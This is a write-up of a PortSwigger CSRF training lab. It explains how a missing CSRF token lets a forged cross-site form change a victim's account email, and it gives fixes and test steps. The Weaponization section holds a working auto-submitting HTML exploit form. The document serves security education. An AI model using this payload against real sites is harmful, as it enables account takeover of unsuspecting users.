# Lab: CSRF vulnerability with no defenses (change email)

![Track: AppSec](https://img.shields.io/badge/Track-AppSec-0B7285?style=for-the-badge)
![Platform: PortSwigger](https://img.shields.io/badge/Platform-PortSwigger-1C7ED6?style=for-the-badge)
![Topic: CSRF](https://img.shields.io/badge/Topic-CSRF-2F9E44?style=for-the-badge)

## Lab Description

This lab contains a CSRF vulnerability in an email-change function. The endpoint performs a state-changing action using
cookie-based session handling and does not include any effective CSRF defense.

Goal: trick a victim user into submitting a forged request that changes their account email address.

## Overview (what's going on)

CSRF works when all of the following conditions are true:

- **A relevant action** exists (here: changing the account email).
- The application relies on **cookie-based sessions**.
- The request contains **no unpredictable parameter** that the attacker cannot know or generate.

In this lab, the change-email request only needs an `email` parameter. There is no CSRF token, no password re-entry,
and no additional request-bound secret. That means a malicious page can fully construct the request in advance.

## 1) Reconnaissance & Findings

I logged in using the provided `wiener:peter` account and tested the email-change function. By inspecting the request in
Burp, I confirmed the following:

- The action is performed through `POST /my-account/change-email`.
- The request contains **no CSRF token** or other unpredictable validation parameter.
- The application identifies the user **only through the session cookie**.

Together, these observations confirm the classic prerequisites for CSRF.

### Example vulnerable request

```http
POST /my-account/change-email HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<victim_session_cookie>
Content-Type: application/x-www-form-urlencoded

email=<new_email_here>
```

The application does not verify whether this request originated from a legitimate page intentionally used by the victim.

## 2) Weaponization (PoC)

If the victim is logged in, the browser may automatically attach the victim's cookies to a cross-site request. That
makes it possible to change the victim's email address through a malicious HTML form hosted on another origin.

Using the lab's Exploit Server, I prepared an auto-submitting proof-of-concept page:

```html
<html>
  <body>
    <h1>You are being hacked... Please wait!</h1>
    <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@hacker.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Why this simple PoC is enough

The attacker does not need to read the response. They only need the victim's browser to **send** the forged request
with the victim's authenticated session cookie attached. If the server trusts the cookie and performs no CSRF
validation, the state-changing action succeeds.

## 3) Exploitation

In the Exploit Server:

1. Paste the PoC into the `Body`.
2. Click `Store`.
3. Click `Deliver exploit to victim`.

When the victim bot visits the exploit page, the form auto-submits in the background and sends the forged
`POST /my-account/change-email` request.

## Evidence (ordered)

1) The exploit HTML is prepared and stored in the Exploit Server:

![Exploit Server PoC](assets/01-exploit-server-poc.png)

2) After delivery, the account page shows the email address has changed successfully:

![My account email changed](assets/02-my-account-email-changed.png)

3) Burp confirms the vulnerable state-changing request sent to `/my-account/change-email`:

![Burp change email request](assets/03-burp-change-email-request.png)

## Impact

- The victim's account email can be changed to an attacker-controlled address.
- This can enable account takeover through password reset or related recovery flows.
- Any similar state-changing function without CSRF defenses may be exploitable in the same way.

## Recommendation (Fix)

Primary fixes:

- Implement **CSRF tokens** on all state-changing endpoints.
- Validate the request **Origin** and/or **Referer** as a defense-in-depth measure.

Hardening:

- Use cookie protections where appropriate: `SameSite=Lax/Strict`, `Secure`, `HttpOnly`.
- Require **re-authentication** or step-up confirmation for especially sensitive actions such as password or email
  changes.

## How to test the fix

- Re-run the Exploit Server PoC and verify the request is rejected.
- Remove or tamper with the CSRF token and confirm the action still fails.
- Check that the email does not change unless the request originates from a legitimate in-app form submission.
